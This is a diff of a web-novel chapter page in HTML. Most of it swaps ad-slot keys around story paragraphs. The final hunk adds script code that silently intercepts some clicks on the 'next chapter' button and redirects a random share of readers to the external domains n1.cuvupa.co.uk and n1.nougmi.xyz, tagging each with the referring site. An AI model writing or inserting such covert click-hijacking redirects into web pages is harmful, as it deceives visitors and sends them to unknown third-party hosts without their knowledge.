@@ -2390,7 +2390,7 @@
                 <p>Warmth flooded Evelyn&#39;s chest, though she found it amusing. &#34;Mom, I&#39;m perfectly content. Alexander wouldn&#39;t dare mistreat me. As for marriage...&#34; She hesitated. &#34;This arrangement works well—it leaves room for an easy separation later.&#34;</p>
                 <p>&#34;Separation?&#34; Grace&#39;s face paled.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>&#34;Just a hypothetical.&#34; Evelyn quickly clarified, spending considerable effort to convince her mother she truly didn&#39;t care about marriage.</p>
                 <p>Finally, Grace relented. &#34;As long as you&#39;re happy. But remember—a man unwilling to commit is hiding something. If he steps out of line again, you must tell me!&#34;</p>
                 <p>Evelyn rubbed her nose, at a loss for words.</p>
@@ -2418,7 +2418,7 @@
                 <p>Evelyn&#39;s temple throbbed. &#34;About what?&#34;</p>
                 <p>&#34;Some say you remarried! Others claim you&#39;re in some angsty lovers&#39; game—you wanting freedom, him demanding remarriage, so he ambushed you at work...&#34;</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
             </div>
             
             <div class="font-controls">
@@ -2540,7 +2540,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2556,8 +2556,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
